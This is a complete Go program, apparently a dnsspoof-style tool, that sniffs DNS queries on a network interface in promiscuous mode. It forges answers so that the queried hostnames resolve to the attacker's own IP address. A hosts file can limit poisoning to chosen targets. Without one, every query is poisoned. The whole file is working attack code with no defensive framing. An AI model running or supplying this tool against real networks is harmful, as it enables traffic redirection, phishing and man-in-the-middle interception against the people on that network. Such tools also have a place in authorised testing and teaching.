package main

import (
	"encoding/csv"
	"flag"
	"fmt"
	"net"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type Targets struct {
	IP            string
	Hostname      string
	RegexHostname string
}

func poison(allRecords []Targets, ip net.IP, handle *pcap.Handle) {

	var Eth layers.Ethernet
	var IP layers.IPv4
	var UDP layers.UDP
	var DNS layers.DNS

	var DNS_Question layers.DNSQuestion
	var DNSR layers.DNSResourceRecord

	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &Eth, &IP, &UDP, &DNS)

	decodedLayers := make([]gopacket.LayerType, 0, 4)

	outputBuffer := gopacket.NewSerializeBuffer()

	serializeOptions := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	var i uint16

	for {
		packetData, _, err := handle.ReadPacketData()
		if err != nil {
			break
		}

		err = decoder.DecodeLayers(packetData, &decodedLayers)
		if err != nil {
			fmt.Println("Decoding error!")
			continue
		}

		//Only proceed if it is a question
		if DNS.QR {
			continue
		}

		//Set packet to be an answer
		DNS.QR = true

		//Set DNS and DNSR fields for all questions
		for i = 0; i < DNS.QDCount; i++ {
			DNS_Question = DNS.Questions[i]
			if DNS_Question.Type != layers.DNSTypeA || DNS_Question.Class != layers.DNSClassIN {
				continue
			}
			DNSR.IP = ip
			DNSR.Name = DNS_Question.Name
			DNS.Answers = append(DNS.Answers, DNSR)
			DNS.ANCount = DNS.ANCount + 1
			DNSR.Type = layers.DNSTypeA
			DNSR.Class = layers.DNSClassIN
			DNSR.TTL = 300
		}

		//If it is recursive, we set it to be true
		if DNS.RD {
			DNS.RA = true
		}

		reg := false
		regIP := false

		dstIP := fmt.Sprintf("%s", IP.SrcIP)
		srcIP := fmt.Sprintf("%s", IP.DstIP)

		//Check if ip and hostnames match those in the poisonhosts file
		for _, targetRecord := range allRecords {

			reg, _ = regexp.MatchString(targetRecord.RegexHostname, string(DNS_Question.Name))
			if reg {
				if targetRecord.IP == dstIP {
					regIP = true
					break
				}
			}
		}

		//If ip and hostnames match those in the poisonhosts file or if the file is not passed
		if (regIP && DNS.ANCount > 0) || len(allRecords) == 0 {

			//swap ethernet packets
			tmpEthernetMac := Eth.SrcMAC
			Eth.SrcMAC = Eth.DstMAC
			Eth.DstMAC = tmpEthernetMac

			//swap ip addresses
			tmpIpAddr := IP.SrcIP
			IP.SrcIP = IP.DstIP
			IP.DstIP = tmpIpAddr

			//swap ports
			tmpUdpPort := UDP.SrcPort
			UDP.SrcPort = UDP.DstPort
			UDP.DstPort = tmpUdpPort
			UDP.SetNetworkLayerForChecksum(&IP)

			err = gopacket.SerializeLayers(outputBuffer, serializeOptions, &Eth, &IP, &UDP, &DNS)

			err = handle.WritePacketData(outputBuffer.Bytes())
			if err != nil {
				panic(err)
			}

			srcPort := fmt.Sprintf("%s", UDP.SrcPort)
			dstPort := fmt.Sprintf("%s", UDP.DstPort)

			//Print packet
			fmt.Print(time.Now().Format("2006-01-02 15:04:05.000000"), " IP ", srcIP, ":", srcPort, " > ", dstIP, ":", dstPort, " ", DNS.ID, " ")
			for i = 0; i < DNS.QDCount; i++ {
				fmt.Printf("%v ", string(DNS.Questions[i].Name))
			}
			fmt.Println(ip)

			continue

		}

	}
}

func resolveHostIp() string {

	netInterfaceAddresses, err := net.InterfaceAddrs()

	if err != nil {
		return ""
	}

	for _, netInterfaceAddress := range netInterfaceAddresses {

		networkIp, ok := netInterfaceAddress.(*net.IPNet)

		if ok && !networkIp.IP.IsLoopback() && networkIp.IP.To4() != nil {

			ip := networkIp.IP.String()

			fmt.Println("Resolved Host IP: " + ip)

			return ip
		}
	}
	return ""
}

func main() {

	devices, _ := pcap.FindAllDevs()

	var oneRecord Targets
	var allRecords []Targets

	//Parse the command line arguments for i and f flags.
	interfacePtr := flag.String("i", devices[0].Name, "a string")
	filePtr := flag.String("f", "", "a string")

	flag.Parse()

	var filter = flag.Args()

	//Open file to read hostnames from
	if *filePtr != "" {
		csvFile, err := os.Open(*filePtr)

		if err != nil {
			fmt.Println(err)
		}

		defer csvFile.Close()

		reader := csv.NewReader(csvFile)

		reader.Comma = ' '

		reader.FieldsPerRecord = -1

		csvData, err := reader.ReadAll()
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		for _, each := range csvData {
			oneRecord.IP = each[0]
			oneRecord.Hostname = each[1]

			temp := "^" + strings.ReplaceAll(each[1], "*", "[\\w\\W]*")
			oneRecord.RegexHostname = strings.ReplaceAll(temp, ".", "\\.") + "$"
			allRecords = append(allRecords, oneRecord)
		}
	}

	var ip net.IP

	ifaces, err := net.Interfaces()
	for _, i := range ifaces {
		if i.Name == *interfacePtr {
			addrs, _ := i.Addrs()
			for _, addr := range addrs {
				networkIp, _ := addr.(*net.IPNet)
				if networkIp.IP.To4() != nil {
					ip = networkIp.IP
				}
			}
		}
	}

	if ip == nil {

		ipVal := ""
		for _, device := range devices {
			if device.Name != *interfacePtr {
				continue
			}
			for _, address := range device.Addresses {
				ipVal = address.IP.String()
			}
		}
		ip = net.ParseIP(ipVal)
	}

	handle, err := pcap.OpenLive(*interfacePtr, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	}

	fmt.Println("Listening on interface ", *interfacePtr)

	defer handle.Close()

	expression := "udp and dst port 53"

	if len(filter) > 0 {
		expression += " and " + filter[0]
	}
	err = handle.SetBPFFilter(expression)
	fmt.Println("Filter is set to : ", expression)
	if err != nil {
		fmt.Printf("Unable to set filter: %v\n", err.Error())
	}

	//Listen to device
	if *interfacePtr != "" {
		poison(allRecords, ip, handle)
	}

}
